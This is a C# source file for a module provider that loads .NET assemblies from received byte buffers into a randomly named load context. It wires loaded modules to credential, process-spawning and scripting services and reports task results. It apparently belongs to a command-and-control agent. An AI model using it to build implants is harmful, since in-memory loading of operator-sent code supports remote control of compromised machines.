using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Collections.Concurrent;
using System.Reflection;
using System.Runtime.Loader;

namespace Workflow.Providers
{
    public class ComponentProvider : IComponentProvider
    {
        private ConcurrentDictionary<string, IModule> loadedModules = new ConcurrentDictionary<string, IModule>();
        private AssemblyLoadContext loadContext = new AssemblyLoadContext(Misc.RandomString(10));
        private ILogger logger { get; set; }
        private IDataBroker messageManager { get; set; }
        private IServiceConfig agentConfig { get; set; }
        private ICredentialProvider tokenManager { get; set; }
        private IRuntimeExecutor spawner { get; set; }
        private IScriptEngine pythonManager { get; set; }
        public ComponentProvider(IDataBroker messageManager, ILogger logger, IServiceConfig agentConfig, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager) {
            this.logger = logger;
            this.messageManager = messageManager;
            this.agentConfig= agentConfig;
            this.tokenManager = tokenManager;
            this.spawner = spawner;
            this.pythonManager = pythonManager;
        }
        
        private bool TryLoadModule(string name, out IModule? plugOut)
        {
            DebugLog.Log($"TryLoadModule: attempting load by assembly name: {name}");
            plugOut = null;
            try
            {
                Assembly _tasksAsm = Assembly.Load($"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                if(_tasksAsm is null)
                {
                    DebugLog.Log($"TryLoadModule: assembly null for {name}");
                    return false;
                }

                if(ParseAssemblyForModule(_tasksAsm))
                {
                    return this.loadedModules.TryGetValue(name, out plugOut);
                }
            }
            catch (Exception e)
            {
                DebugLog.Log($"TryLoadModule: exception for {name}: {e.Message}");
            }
            return false;

        }

        public bool LoadAssemblyAsync(string task_id, byte[] buf)
        {
            DebugLog.Log($"LoadAssemblyAsync: loading assembly [{task_id}]");
            try
            {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
                DebugLog.Log($"LoadAssemblyAsync: success [{task_id}]");
                messageManager.AddTaskResponse(new TaskResponse
                {
                    task_id = task_id,
                    user_output = "Loaded.",
                    completed = true
                });
                return true;
            }
            catch (Exception e)
            {
                DebugLog.Log($"LoadAssemblyAsync: failed [{task_id}]: {e.Message}");
                messageManager.AddTaskResponse(new TaskResponse
                {
                    task_id = task_id,
                    completed = true,
                    user_output = e.ToString(),
                    status = "error",
                });
            }
            return false;
        }
        public bool LoadModuleAsync(string task_id, string moduleName, byte[] buf)
        {
            DebugLog.Log($"LoadModuleAsync: {moduleName} [{task_id}]");
            try {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));

                if (this.loadedModules.ContainsKey(moduleName))
                {
                    this.messageManager.AddTaskResponse(new LoadTaskResponse
                    {
                        completed = true,
                        user_output = "Module already loaded.",
                        task_id = task_id,
                        status = "error"
                    });
                    return false;
                }

                if (this.ParseAssemblyForModule(loadedAssembly))
                {
                    DebugLog.Log($"LoadModuleAsync: success {moduleName}");
                    return true;
                }
                DebugLog.Log($"LoadModuleAsync: no IModule found in assembly for {moduleName}");
            }
            catch (Exception e)
            {
                DebugLog.Log($"LoadModuleAsync: failed {moduleName}: {e.Message}");
                this.messageManager.AddTaskResponse(new LoadTaskResponse
                {
                    completed = true,
                    task_id = task_id,
                    status = "error",
                    user_output = e.ToString()
                });
            }

            return false;
        }
        private bool ParseAssemblyForModule(Assembly asm)
        {
            foreach (Type t in asm.GetTypes())
            {
                if (typeof(IModule).IsAssignableFrom(t))
                {
                    IModule plug = (IModule)Activator.CreateInstance(t, messageManager, agentConfig, logger, tokenManager, spawner, pythonManager);
                    this.loadedModules.GetOrAdd(plug.Name, plug);
                    DebugLog.Log($"ParseAssemblyForModule: found IModule type {t.Name} as {plug.Name}");
                    return true;
                }
            }
            return false;
        }
        public bool TryGetModule<T>(string name, out T? plugin) where T : IModule
        {
            DebugLog.Log($"TryGetModule: looking up {name}");
            IModule plug = null;


            if(loadedModules.TryGetValue(name, out plug) || this.TryLoadModule(name, out plug))
            {
                if (plug is T typedPlugin)
                {
                    DebugLog.Log($"TryGetModule: found {name}");
                    plugin = typedPlugin;
                    return true;
                }
            }

            DebugLog.Log($"TryGetModule: not found {name}");
            plugin = default(T);
            return false;
        }
    }
}
